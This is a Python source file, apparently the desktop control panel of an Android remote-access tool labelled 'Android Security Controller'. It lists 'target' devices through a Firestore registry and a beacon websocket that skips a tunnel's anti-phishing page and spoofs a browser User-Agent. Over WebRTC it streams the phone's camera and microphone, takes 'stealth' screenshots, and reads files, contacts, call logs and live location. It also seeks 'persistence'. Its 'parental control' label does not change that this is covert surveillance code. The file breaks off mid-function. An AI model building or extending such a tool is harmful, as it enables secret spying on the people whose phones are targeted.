import customtkinter as ctk
from webrtc_handler import WebRTCHandler
from download_manager import DownloadProgressUI
from file_operations import FileOperationsManager
import threading
import json
import asyncio
import websockets
from PIL import Image, ImageTk
import os
import io
import requests
import webbrowser
import tkintermapview
import socket
from datetime import datetime

def get_local_ip():
    """Get the local WiFi/Ethernet IP address of this machine."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('8.8.8.8', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

class MonitoringApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.project_id = "YOUR_FIREBASE_PROJECT_ID"
        self.webrtc = WebRTCHandler(self.project_id)
        self.file_ops = FileOperationsManager(self)

        self.title("Android Security Controller")
        self.geometry("1400x850") # Slightly wider for status panels

        self.device_status = {}
        self.app_usage_data = []
        self.app_usage_days = []
        self.current_path_label = None

        # Set theme
        ctk.set_appearance_mode("dark")
        
        # Theme Variables
        self.FONT_MAIN = ("Segoe UI", 13)
        self.FONT_HEADER = ("Segoe UI", 15, "bold")
        self.FONT_TITLE = ("Segoe UI", 24, "bold")
        self.FONT_SMALL = ("Segoe UI", 11)
        self.C_BG = "#0f1115"
        self.C_PANEL = "#161a20"
        self.C_HOVER = "#1f2530"
        self.C_ACCENT = "#3a82f7"
        self.C_TEXT = "#e6e6e6"
        self.C_MUTED = "#9aa4b2"
        self.C_ALT = "#13171c"

        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=0) # FOOTER
        self.grid_columnconfigure(0, weight=0) # Sidebar
        self.grid_columnconfigure(1, weight=1) # Main App
        self.grid_columnconfigure(2, weight=0) # Right Panel
        
        self.active_devices = set()
        self.known_devices = set()
        
        self.fetch_historical_devices()
        self.after(5000, self.update_device_status)
        self.after(1000, self.start_beacon_listener)

        # Sidebar Frame (Scrollable for infinite features)
        self.sidebar_frame = ctk.CTkScrollableFrame(self, width=220, corner_radius=0, fg_color=self.C_PANEL, label_text="CONTROL PANEL", label_font=("Segoe UI Bold", 11), label_text_color=self.C_MUTED)
        self.sidebar_frame.grid(row=0, column=0, sticky="nsew")
        
        self.logo_label = ctk.CTkLabel(self.sidebar_frame, text="🛡️ SYSTEM CORE", font=("Segoe UI", 18, "bold"), text_color=self.C_TEXT)
        self.logo_label.pack(side="top", anchor="w", padx=20, pady=(20, 10))

        self.devices_label = ctk.CTkLabel(self.sidebar_frame, text="CLOUD DEVICES:\n[Scanning...]", 
                                          text_color=self.C_ACCENT, font=("Segoe UI", 12), justify="left")
        self.devices_label.pack(side="top", anchor="w", pady=(10, 20), padx=20)

        # Sidebar Navigation (Hidden until device selection)
        self.dashboard_button = ctk.CTkButton(self.sidebar_frame, text=" 📊 Monitor", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=self.show_dashboard_view)
        self.camera_button = ctk.CTkButton(self.sidebar_frame, text=" 👁️ Camera", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=self._toggle_camera)

        
        self.call_button = ctk.CTkButton(self.sidebar_frame, text=" 📞 Voice Call", command=self._toggle_call, fg_color="transparent", border_width=2, border_color="#4CAF50", height=40)
        self.mic_button = ctk.CTkButton(self.sidebar_frame, text=" 🎤 Phone Mic (Listen)", command=self._toggle_mic, fg_color="transparent", border_width=2, height=36)
        self.pc_speaker_button = ctk.CTkButton(self.sidebar_frame, text=" 🗣️ PC Mic -> Speaker", command=self._toggle_pc_mic, fg_color="transparent", border_width=2, height=36)
        self.files_button = ctk.CTkButton(self.sidebar_frame, text=" 📁 Filesystem", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=self.show_files_view)
        self.contacts_button = ctk.CTkButton(self.sidebar_frame, text=" 📇 Contacts", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=self.show_contacts_view)
        self.call_logs_button = ctk.CTkButton(self.sidebar_frame, text=" 📞 Call Logs", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=self.show_call_logs_view)
        self.parental_button = ctk.CTkButton(self.sidebar_frame, text=" 📊 Parental Control", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=self.show_usage_view)
        self.location_button = ctk.CTkButton(self.sidebar_frame, text=" 📍 Live Location", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=self.show_location_view)
        self.activity_button = ctk.CTkButton(self.sidebar_frame, text=" 📝 Activity Logs", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=self.show_activity_view)
        self.screenshot_button = ctk.CTkButton(self.sidebar_frame, text=" 📸 Stealth Screenshot", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_ACCENT, hover_color=self.C_HOVER, anchor="w", command=self._take_stealth_screenshot)
        self.wake_button = ctk.CTkButton(self.sidebar_frame, text=" ☀️ Wake Screen", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=lambda: self.webrtc.send_command({"type": "navigation", "navAction": "WAKE"}))
        self.home_button = ctk.CTkButton(self.sidebar_frame, text=" 🏠 Home Button", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=lambda: self.webrtc.send_command({"type": "navigation", "navAction": "HOME"}))
        self.recents_button = ctk.CTkButton(self.sidebar_frame, text=" 🗂️ Recent Apps", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=lambda: self.webrtc.send_command({"type": "navigation", "navAction": "RECENTS"}))
        self.apps_button = ctk.CTkButton(self.sidebar_frame, text=" 📱 Applications", corner_radius=4, height=36, font=self.FONT_MAIN, fg_color="transparent", text_color=self.C_TEXT, hover_color=self.C_HOVER, anchor="w", command=self.show_apps_view)
        
        self.pc_mic_active = False
        self.map_widget = None
        self.shortcuts_frame = ctk.CTkFrame(self.sidebar_frame, fg_color="transparent")

        # Status Indicator pushes bottom
        self.status_label = ctk.CTkLabel(self.sidebar_frame, text="STATUS: OFFLINE", text_color="#ef4444", font=("Segoe UI", 12, "bold"))
        self.status_label.pack(side="top", anchor="w", pady=(10, 20), padx=20)

        # Main Content Area
        self.main_frame = ctk.CTkFrame(self, corner_radius=0, fg_color=self.C_BG)
        self.main_frame.grid(row=0, column=1, sticky="nsew")
        self.main_frame.grid_rowconfigure(0, weight=1)
        self.main_frame.grid_columnconfigure(0, weight=1)

        # Right Info Panel 
        self.right_panel = ctk.CTkFrame(self, width=400, corner_radius=0, fg_color=self.C_PANEL)
        self.right_panel.grid(row=0, column=2, sticky="nsew")
        self.right_panel.grid_propagate(False)
        self.right_panel.grid_remove() # Hidden initially
        
        self.current_lens = "front"
        self.camera_active = False
        self.camera_rotation = 0
        self.camera_mirror = False

        # Download Progress UI
        self.download_ui = DownloadProgressUI(self.main_frame)
        self.webrtc.on_download_progress = self._on_download_progress
        self.webrtc.on_file_start = self._on_file_start
        self.webrtc.on_file_saved = self._on_file_saved
        self.webrtc.on_camera_frame = self._update_camera_frame
        self.webrtc.on_screenshot = self._show_screenshot_popup
        self.webrtc.on_apps_list = self._update_app_list
        self.webrtc.on_disconnected = self._on_disconnected

        # Footer / System Status Bar
        self.footer_frame = ctk.CTkFrame(self, height=35, corner_radius=0, fg_color=self.C_BG, border_width=1, border_color=self.C_ALT)
        self.footer_frame.grid(row=1, column=0, columnspan=3, sticky="ew")
        self.footer_frame.grid_propagate(False)
        
        # Footer Content
        self.footer_target_lbl = ctk.CTkLabel(self.footer_frame, text="🛰️ TARGET (P2P): [None Selected]", font=("Segoe UI", 10), text_color=self.C_MUTED)
        self.footer_target_lbl.pack(side="left", padx=20)
        
        self.footer_latency_lbl = ctk.CTkLabel(self.footer_frame, text="⚡ LATENCY: --ms", font=("Segoe UI", 10), text_color=self.C_MUTED)
        self.footer_latency_lbl.pack(side="left", padx=20)
        
        self.footer_persistence_lbl = ctk.CTkLabel(self.footer_frame, text="🔒 PERSISTENCE: UNKNOWN", font=("Segoe UI", 10), text_color=self.C_MUTED)
        self.footer_persistence_lbl.pack(side="left", padx=20)

        self.footer_ip_lbl = ctk.CTkLabel(self.footer_frame, text=f"🌐 CTRL: {get_local_ip()}", font=("Segoe UI", 10), text_color=self.C_MUTED)
        self.footer_ip_lbl.pack(side="right", padx=20)

        self.initial_view()

    def load_icons(self):
        icons = {}
        for name in ['dashboard', 'camera', 'mic', 'files']:
            path = f"assets/{name}.png"
            if os.path.exists(path):
                img = Image.open(path)
                icons[name] = ctk.CTkImage(light_image=img, dark_image=img, size=(20, 20))
            else:
                icons[name] = None
        return icons

    def initial_view(self):
        self.current_main_view = "selection"
        self.show_device_selection_view()

    def fetch_historical_devices(self):
        def _fetch():
            try:
                url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/devices"
                res = requests.get(url, timeout=5)
                if res.status_code == 200:
                    data = res.json()
                    docs = data.get("documents", [])
                    for d in docs:
                        dev_id = d.get("name", "").split("/")[-1]
                        if dev_id:
                            self.known_devices.add(dev_id)
                self.after(0, self._update_devices_ui)
            except Exception as e:
                print(f"Failed to fetch historical devices: {e}")
        
        threading.Thread(target=_fetch, daemon=True).start()

    def show_device_selection_view(self):
        self.current_main_view = "selection"
        self.lock_ui_controls() # Hide session buttons
        for child in self.main_frame.winfo_children():
            child.destroy()
        
        title = ctk.CTkLabel(self.main_frame, text="SELECT TARGET DEVICE", font=self.FONT_TITLE)
        title.pack(pady=(60, 20))
        
        all_devices = self.known_devices.union(self.active_devices)
        if not all_devices:
            lbl = ctk.CTkLabel(self.main_frame, text="AWAITING DEVICE REGISTRY...", font=("Segoe UI", 16), text_color=self.C_MUTED)
            lbl.pack(pady=40)
        else:
            for dev in sorted(all_devices):
                is_online = dev in self.active_devices
                color = self.C_ACCENT if is_online else self.C_PANEL
                hover_c = self.C_HOVER
                status_text = " [ACTIVE]" if is_online else " [OFFLINE]"
                
                def _cmd(d=dev, online=is_online):
                    if online:
                        self.select_device(d)
                        
                btn = ctk.CTkButton(self.main_frame, text=f"📱 {dev}{status_text}", 
                                    font=("Segoe UI", 16, "bold"),
                                    fg_color=color, hover_color=hover_c, height=50, width=400,
                                    command=_cmd)
                btn.pack(pady=10)

    def select_device(self, dev_id):
        self.selected_device = dev_id
        
        # Switch to dashboard view
        self.show_dashboard_view()
        
        # Always trigger connection to ensure P2P is established and UI is unlocked
        if not hasattr(self, 'connection_thread') or not self.connection_thread.is_alive():
            self.start_connection()
        else:
            # If already running, check if we need to manually unlock (in case we were already connected)
            if getattr(self.webrtc.data_channel, 'readyState', 'closed') == 'open':
                self.unlock_ui_controls()

    def unlock_ui_controls(self):
        """Called when P2P connection is established. Unlocks monitoring tools."""
        self.status_label.configure(text="STATUS: ONLINE", text_color="#22c55e")
        
        # Poke the device for immediate status/telemetry
        self.after(500, self.webrtc.request_status)
        
        # Use .pack() for reliable scrolling within CTkScrollableFrame
        sidebar_btns = [
            self.dashboard_button, self.camera_button, self.contacts_button, 
            self.call_logs_button, self.parental_button, self.location_button,
            self.activity_button, self.screenshot_button, self.apps_button,
            self.wake_button, self.home_button, self.recents_button, 
            self.files_button, self.call_button, self.mic_button, self.pc_speaker_button
        ]
        
        for btn in sidebar_btns:
            try: btn.grid_forget()
            except: pass
            btn.pack(side="top", fill="x", padx=10, pady=2)
            
        # Update Dashboard status if active
        if hasattr(self, 'dash_status_label') and self.dash_status_label.winfo_exists():
            self.dash_status_label.configure(text="CONNECTED", text_color="#22c55e")
            
        self.request_file_list("/")

    def lock_ui_controls(self):
        """Hides all session-specific controls"""
        self.status_label.configure(text="STATUS: OFFLINE", text_color="#ef4444")
        
        # Update Dashboard status if active
        if hasattr(self, 'dash_status_label') and self.dash_status_label.winfo_exists():
            self.dash_status_label.configure(text="OFFLINE", text_color="#ef4444")
            
        for btn in [self.dashboard_button, self.camera_button, self.call_button, 
                    self.mic_button, self.pc_speaker_button, self.files_button,
                    self.contacts_button, self.call_logs_button, self.parental_button,
                    self.location_button, self.activity_button, self.screenshot_button,
                    self.wake_button, self.home_button, self.recents_button]:
            btn.pack_forget()
            try: btn.grid_forget() # Clean fallback
            except: pass

    def _nav_shortcut(self, path):
        if getattr(self, 'current_main_view', None) != "files":
            self.show_files_view()
        self.request_file_list(path)

    def _toggle_call(self):
        """Toggles full-duplex call (both mics)"""
        is_calling = getattr(self, '_is_calling', False)
        
        if not is_calling:
            # Start Both
            self.webrtc.start_mic()
            success = self.webrtc.start_pc_mic()
            if success:
                self._is_calling = True
                self.pc_mic_active = True
                
                # Update UI
                self.call_button.configure(fg_color="#4CAF50", text=" 📞 End Call")
                self.mic_button.configure(fg_color="#4CAF50", text=" 🎤 Phone Mic: ON")
                self.pc_speaker_button.configure(fg_color="#4CAF50", text=" 🗣️ PC Mic: ON")
        else:
            # Stop Both
            self.webrtc.stop_mic()
            self.webrtc.stop_pc_mic()
            self._is_calling = False
            self.pc_mic_active = False
            self.phone_mic_active = False
            
            # Reset UI
            self.call_button.configure(fg_color="transparent", text=" 📞 Voice Call")
            self.mic_button.configure(fg_color="transparent", text=" 🎤 Phone Mic (Listen)")
            self.pc_speaker_button.configure(fg_color="transparent", text=" 🗣️ PC Mic -> Speaker")

    def _toggle_mic(self):
        is_active = getattr(self, 'phone_mic_active', False)
        if not is_active:
            self.webrtc.start_mic()
            self.phone_mic_active = True
            self.mic_button.configure(fg_color="#4CAF50", text=" 🎤 Phone Mic: ON")
        else:
            self.webrtc.stop_mic()
            self.phone_mic_active = False
            self.mic_button.configure(fg_color="transparent", text=" 🎤 Phone Mic (Listen)")

    def _toggle_pc_mic(self):
        is_active = getattr(self, 'pc_mic_active', False)
        if not is_active:
            success = self.webrtc.start_pc_mic()
            if success:
                self.pc_mic_active = True
                self.pc_speaker_button.configure(fg_color="#4CAF50", text=" 🗣️ PC Mic: ON")
        else:
            self.webrtc.stop_pc_mic()
            self.pc_mic_active = False
            self.pc_speaker_button.configure(fg_color="transparent", text=" 🗣️ PC Mic -> Speaker")
    def _toggle_camera(self):
        """Toggle camera stream"""
        if not self.camera_active:
            if getattr(self, 'screen_active', False): self._toggle_screen_control()
            self.webrtc.start_camera(lens=self.current_lens)
            self.camera_active = True
            
            self.camera_button.configure(fg_color="#4CAF50", text=" 👁️ Camera: ON")
            self._show_camera_view()
        else:
            self.webrtc.stop_camera()
            self.camera_active = False
            self.camera_button.configure(fg_color="transparent", text=" 👁️ Camera")
            self.right_panel.grid_remove()



    def _switch_lens(self):
        self.current_lens = "front" if self.current_lens == "back" else "back"
        if self.camera_active:
            self.webrtc.start_camera(lens=self.current_lens)
            self._show_camera_view() # Refresh UI labels

    def _rotate_camera(self):
        """Cycle rotation 0 -> 90 -> 180 -> 270"""
        self.camera_rotation = (self.camera_rotation + 90) % 360
        # No print needed, frame processor handles it

    def _toggle_mirror(self):
        """Toggle horizontal mirror"""
        self.camera_mirror = not self.camera_mirror \

    def _show_camera_view(self):
        """Prepare Right Panel for Camera Feed"""
        self.right_panel.grid()
        for child in self.right_panel.winfo_children():
            child.destroy()
            
        header = ctk.CTkFrame(self.right_panel, fg_color=self.C_ALT, height=60, corner_radius=0)
        header.pack(fill="x")
        header.pack_propagate(False)
        
        ctk.CTkLabel(header, text=f"📷 CAMERA FEED ({self.current_lens.upper()})", 
                     font=self.FONT_HEADER).pack(side="left", padx=20)
        
        # Action Buttons
        ctk.CTkButton(header, text="🔄 Rotate", width=75, height=28, fg_color=self.C_BG, hover_color=self.C_HOVER, command=self._rotate_camera).pack(side="right", padx=5)
        ctk.CTkButton(header, text="🪞 Mirror", width=75, height=28, fg_color=self.C_BG, hover_color=self.C_HOVER, command=self._toggle_mirror).pack(side="right", padx=5)
        ctk.CTkButton(header, text="📲 Switch Lens", width=95, height=28, command=self._switch_lens).pack(side="right", padx=5)
        
        self.camera_display = ctk.CTkLabel(self.right_panel, text="Awaiting frames...", 
                                           fg_color="#000", corner_radius=8)
        self.camera_display.pack(fill="both", expand=True, padx=10, pady=10)

    def _on_disconnected(self):
        """Called when WebSocket drops — auto-reconnect is already running."""
        self.after(0, lambda: self.status_label.configure(
            text="STATUS: RECONNECTING...", text_color="#FFCC00"))

    def start_connection(self):
        self.status_label.configure(text="STATUS: CONNECTING...", text_color="#FFCC00")
        self.connection_thread = threading.Thread(target=self._run_webrtc, daemon=True)
        self.connection_thread.start()

    def update_device_status(self):
        is_online = hasattr(self, 'webrtc') and getattr(self.webrtc, 'ws', None) is not None
        self._set_status_ui(is_online)
        self.after(30000, self.update_device_status)

    def start_beacon_listener(self):
        def _listen():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._beacon_task())
        threading.Thread(target=_listen, daemon=True).start()

    async def _beacon_task(self):
        try:
            with open("server_url.txt", "r") as f:
                uri = f.read().strip()
        except Exception:
            return
            
        while True:
            try:
                headers = {
                    'X-Tunnel-Skip-AntiPhishing-Page': 'true',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }
                async with websockets.connect(uri, additional_headers=headers) as ws:
                    # Register so the server knows were a controller and broadcasts target events
                    await ws.send(json.dumps({"type": "register", "role": "controller"}))
                    
                    async for message in ws:
                        # Skip binary messages (audio/camera frames)
                        if isinstance(message, bytes):
                            continue
                        try:
                            data = json.loads(message)
                        except (json.JSONDecodeError, ValueError):
                            continue
                        mtype = data.get('type')
                        
                        # Identify the device from many possible fields (server dependent)
                        dev = data.get('device_id') or data.get('id') or data.get('_sender_id')
                        # Check sender role metadata
                        role = data.get('role', '') or data.get('_sender_role', '')
                        
                        # Handle 'connected' pairing message (has no device_id)
                        if mtype == 'connected':
                            # Use dynamic device_id from the message, fallback to sender info
                            connected_dev = data.get('device_id') or data.get('id') or 'unknown_device'
                            if connected_dev not in self.active_devices:
                                self.active_devices.add(connected_dev)
                                self.after(0, self._update_devices_ui)
                            continue
                        
                        # Only handle if its a known device signal or from an android/target role
                        if dev and dev != "controller":
                            is_target = role in ['android_phone', 'target']
                            if mtype in ['heartbeat', 'register', 'device_status', 'ping', 'offer'] or is_target:
                                if dev not in self.active_devices:
                                    self.active_devices.add(dev)
                                    self.after(0, self._update_devices_ui)
            except Exception as e:
                print(f"[Beacon] Connection error: {e}")
                await asyncio.sleep(5)

    def _update_devices_ui(self):
        all_devices = self.known_devices.union(self.active_devices)
        if not all_devices:
            self.devices_label.configure(text="CLOUD REGISTRY:\n[None Found]")
        else:
            lines = []
            for d in sorted(all_devices):
                indicator = "🟢" if d in self.active_devices else "🔴"
                lines.append(f"{indicator} {d}")
            self.devices_label.configure(text="CLOUD REGISTRY:\n" + "\n".join(lines))
        
        # If we are currently on the selection view, redraw it to show the new button
        if getattr(self, "current_main_view", "") == "selection":
            self.show_device_selection_view()

    def _set_status_ui(self, is_online):
        if is_online:
            self.status_label.configure(text="STATUS: ONLINE", text_color="#22c55e")
        else:
            self.status_label.configure(text="STATUS: OFFLINE", text_color="#ef4444")

    def show_dashboard_view(self):
        self.current_main_view = "dashboard"
        for child in self.main_frame.winfo_children():
            child.destroy()
        
        title = ctk.CTkLabel(self.main_frame, text="SYSTEM DASHBOARD", font=self.FONT_TITLE)
        title.pack(pady=40)
        
        info_frame = ctk.CTkFrame(self.main_frame, fg_color=self.C_PANEL, corner_radius=8)
        info_frame.pack(padx=80, fill="x")
        
        dev_id = getattr(self, 'selected_device', 'UNKNOWN')
        self.add_info_row(info_frame, "ACTIVE DEVICE", dev_id, 0)
        self.add_info_row(info_frame, "SIGNALING", self.project_id, 1)
        
        # Dynamic connection status label
        self.dash_status_label = ctk.CTkLabel(info_frame, text="CONNECTED", font=self.FONT_MAIN, text_color="#22c55e", anchor="w")
        self.dash_status_label.grid(row=2, column=1, padx=20, pady=15, sticky="w")
        ctk.CTkLabel(info_frame, text="STATUS:", font=self.FONT_HEADER, text_color=self.C_MUTED, anchor="w").grid(row=2, column=0, padx=20, pady=15, sticky="w")

        # Real-time Status Cards
        cards_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        cards_frame.pack(padx=80, pady=20, fill="x")
        cards_frame.grid_columnconfigure((0, 1, 2, 3), weight=1)

        # Battery Card
        self.batt_card = self._create_status_card(cards_frame, "🔋 BATTERY", "Awaiting...", 0)
        # Network Card
        self.net_card = self._create_status_card(cards_frame, "📶 NETWORK", "Awaiting...", 1)
        # Bluetooth Card
        self.bt_card = self._create_status_card(cards_frame, "🔵 BLUETOOTH", "Awaiting...", 2)
        # Device Card
        self.info_card = self._create_status_card(cards_frame, "📱 DEVICE", "Awaiting...", 3)

        # 24/7 Persistence Action Row
        action_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        action_frame.pack(padx=80, pady=(10, 0), fill="x")
        
        self.persist_btn = ctk.CTkButton(
            action_frame, text="🔋 REQUEST 24/7 PERSISTENCE (WHITELIST)", 
            height=40, font=self.FONT_HEADER, fg_color="#f59e0b", hover_color="#d97706",
            command=lambda: self.webrtc.send_command({"type": "request_persistence"})
        )
        self.persist_btn.pack(fill="x")
        
        ctk.CTkLabel(action_frame, text="⚠ Only use this if you have physical access to the device to accept the Android prompt.", 
                     font=self.FONT_SMALL, text_color=self.C_MUTED).pack(pady=5)

        # Initial data fill if we have it
        if hasattr(self, 'device_status') and self.device_status:
            self._update_device_status(self.device_status)

        # Parental Control Section (at the bottom)
        self.dashboard_usage_frame = ctk.CTkFrame(self.main_frame, fg_color=self.C_PANEL, corner_radius=12)
        self.dashboard_usage_frame.pack(padx=80, pady=(20, 40), fill="both", expand=True)
        
        ctk.CTkLabel(self.dashboard_usage_frame, text="🛡️ PARENTAL CONTROL: TOP APP USAGE", 
                     font=self.FONT_HEADER, text_color=self.C_ACCENT).pack(pady=(20, 10))
        
        self.usage_summary_container = ctk.CTkFrame(self.dashboard_usage_frame, fg_color="transparent")
        self.usage_summary_container.pack(fill="both", expand=True, padx=20, pady=10)
        
        if hasattr(self, 'app_usage_data') and self.app_usage_data:
            self._update_dashboard_usage_summary()
        else:
            ctk.CTkLabel(self.usage_summary_container, text="Awaiting usage data from device...", 
                         font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=30)
            self.webrtc.request_usage_stats()

    def _create_status_card(self, parent, title, value, col):
        card = ctk.CTkFrame(parent, fg_color=self.C_PANEL, corner_radius=12)
        card.grid(row=0, column=col, padx=8, sticky="nsew")
        
        ctk.CTkLabel(card, text=title, font=self.FONT_SMALL, text_color=self.C_MUTED).pack(pady=(15, 5))
        lbl = ctk.CTkLabel(card, text=value, font=self.FONT_HEADER, text_color=self.C_TEXT)
        lbl.pack(pady=(0, 20))
        return lbl

    def _update_device_status(self, data):
        """Update internal state and refresh UI components across all views"""
        self.device_status = data
        
        # Update persistent sidebar labels if they exist
        level = data.get('batteryLevel', 0)
        plugged = " (⚡)" if data.get('isCharging') else ""
        if hasattr(self, 'sidebar_batt_label'):
            self.sidebar_batt_label.configure(text=f"{level}%{plugged}")
            
        if getattr(self, 'current_main_view', None) == "dashboard":
            # Update Dashboard Cards
            if hasattr(self, 'batt_card') and self.batt_card.winfo_exists():
                self.batt_card.configure(text=f"{level}%{plugged}")
                if level > 70: self.batt_card.configure(text_color="#22c55e")
                elif level > 20: self.batt_card.configure(text_color="#f59e0b")
                else: self.batt_card.configure(text_color="#ef4444")

            # Update Network with Signal Strength
            net_type = data.get('networkType', 'Unknown').upper()
            ssid = data.get('wifiSSID', '')
            signal = data.get('wifiSignal', -1)
            
            sig_text = ""
            if signal != -1:
                # Basic RSSI to Level mapping (Android typically uses 4 levels)
                # Excellent: > -50 dBm, Good: -50 to -60, Fair: -60 to -70, Poor: < -70
                if signal > -50: sig_text = " (Excellent)"
                elif signal > -60: sig_text = " (Good)"
                elif signal > -70: sig_text = " (Fair)"
                else: sig_text = " (Poor)"
            
            net_text = f"{net_type}{sig_text}"
            if ssid and ssid != "Unknown" and ssid != "<unknown ssid>":
                net_text += f"\n{ssid}"
                
            if hasattr(self, 'net_card') and self.net_card.winfo_exists():
                self.net_card.configure(text=net_text)

            # Update Bluetooth
            bt_status = data.get('bluetoothStatus', 'Unknown').upper()
            if hasattr(self, 'bt_card') and self.bt_card.winfo_exists():
                self.bt_card.configure(text=bt_status)
                self.bt_card.configure(text_color="#3b82f6" if bt_status == "ENABLED" or bt_status == "ON" else "#6b7280")
            
            dev_name = data.get('deviceName', '')
            model = data.get('model', 'Unknown')
            display_name = dev_name if dev_name else model
            if hasattr(self, 'info_card') and self.info_card.winfo_exists():
                self.info_card.configure(text=display_name)
                self.info_card.configure(text_color=self.C_TEXT)
            
            # Update Footer
            if hasattr(self, 'footer_target_lbl'):
                uptime = data.get('uptime', 0) // 1000 # Convert to sec
                self.footer_target_lbl.configure(text=f"🛰️ TARGET: {display_name} | UP: {uptime}s")
                
                is_ignoring = data.get('isIgnoringBattery', False)
                p_text = "🔒 PERSISTENCE: ACTIVE (WHITELISTED)" if is_ignoring else "🔓 PERSISTENCE: STANDARD (OPTIMIZED)"
                p_color = "#22c55e" if is_ignoring else "#f59e0b"
                self.footer_persistence_lbl.configure(text=p_text, text_color=p_color)

            # Update Parental Control Summary (Top 5 Apps) if on dashboard
            if hasattr(self, 'dashboard_usage_frame') and getattr(self, 'app_usage_data', None):
                self._update_dashboard_usage_summary()


    def add_info_row(self, parent, key, value, row, color=None):
        text_c = color if color else self.C_TEXT
        k = ctk.CTkLabel(parent, text=f"{key}:", font=self.FONT_HEADER, text_color=self.C_MUTED, anchor="w")
        k.grid(row=row, column=0, padx=20, pady=15, sticky="w")
        v = ctk.CTkLabel(parent, text=value, font=self.FONT_MAIN, text_color=text_c, anchor="w")
        v.grid(row=row, column=1, padx=20, pady=15, sticky="w")

    def _run_webrtc(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Wire up callbacks from the WebRTC handler to the UI
        def on_connected():
            self.after(0, self.unlock_ui_controls)
        
        def on_message(message):
            self.after(0, lambda m=message: self.handle_data_message(m))

        def on_file_saved(path):
            self.after(0, lambda p=path: self.open_file_preview(p))

        def on_file_info(data):
            self.after(0, lambda d=data: self._show_file_details(d))

        def on_thumbnail(raw_bytes):
            self.after(0, lambda b=raw_bytes: self._show_thumbnail(b))

        def on_inline_thumb(path, raw_bytes):
            self.after(0, lambda p=path, b=raw_bytes: self._inline_set_thumbnail(p, b))

        def on_camera_frame(raw_bytes):
            self.after(0, lambda b=raw_bytes: self._update_camera_frame(b))
        
        self.webrtc.on_connected = on_connected
        self.webrtc.on_message = on_message
        self.webrtc.on_file_saved = on_file_saved
        self.webrtc.on_file_info = on_file_info
        self.webrtc.on_thumbnail = on_thumbnail
        self.webrtc.on_inline_thumbnail = on_inline_thumb
        self.webrtc.on_camera_frame = on_camera_frame
        
        loop.run_until_complete(self.webrtc.start_call())
        loop.run_forever()

    def show_files_view(self):
        self.current_main_view = "files"
        for child in self.main_frame.winfo_children():
            child.destroy()
            
        top_frame = ctk.CTkFrame(self.main_frame, fg_color=self.C_PANEL, height=50, corner_radius=0)
        top_frame.pack(fill="x", padx=0, pady=0)
        top_frame.pack_propagate(False)
        
        toolbar_buttons = ctk.CTkFrame(top_frame, fg_color="transparent")
        toolbar_buttons.pack(side="left", fill="x", expand=True, padx=10)

        # Left buttons
        left_btns = ctk.CTkFrame(toolbar_buttons, fg_color="transparent")
        left_btns.pack(side="left")

        self.up_btn = ctk.CTkButton(left_btns, text="⬆ Up", width=50, height=28, 
                                    fg_color="transparent", hover_color=self.C_HOVER, text_color=self.C_TEXT, 
                                    command=self.go_up_directory)
        self.up_btn.pack(side="left", padx=5)

        self.refresh_btn = ctk.CTkButton(left_btns, text="🔄 Refresh", width=70, height=28, 
                                        fg_color="transparent", hover_color=self.C_HOVER, text_color=self.C_TEXT, 
                                        command=lambda: self.request_file_list(getattr(self, 'current_browsing_path', None)))
        self.refresh_btn.pack(side="left", padx=5)

        # Paste button (visible only when clipboard has items)
        self.toolbar_paste_btn = ctk.CTkButton(left_btns, text="📌 Paste", width=70, height=28,
                                             fg_color="#22c55e", hover_color="#16a34a", text_color="#000",
                                             command=self.file_ops._paste_here)
        if hasattr(self.file_ops, '_clipboard') and self.file_ops._clipboard:
            self.toolbar_paste_btn.pack(side="left", padx=5)
        
        # Toolbar: Reference top_frame for breadcrumbs
        self.toolbar_frame = top_frame 
        
        # Breadcrumb Container
        self.breadcrumb_container = ctk.CTkFrame(left_btns, fg_color="transparent")
        self.breadcrumb_container.pack(side="left", padx=10, fill="y")
        self.current_path_label = None 
        
        # Search Bar
        self.search_entry = ctk.CTkEntry(toolbar_buttons, placeholder_text="🔍 Search files...", width=200, height=28, border_color=self.C_HOVER, fg_color="#1a1e24")
        self.search_entry.pack(side="right", padx=5)
        self.search_entry.bind("<KeyRelease>", self._on_search_change)

        # View Toggle
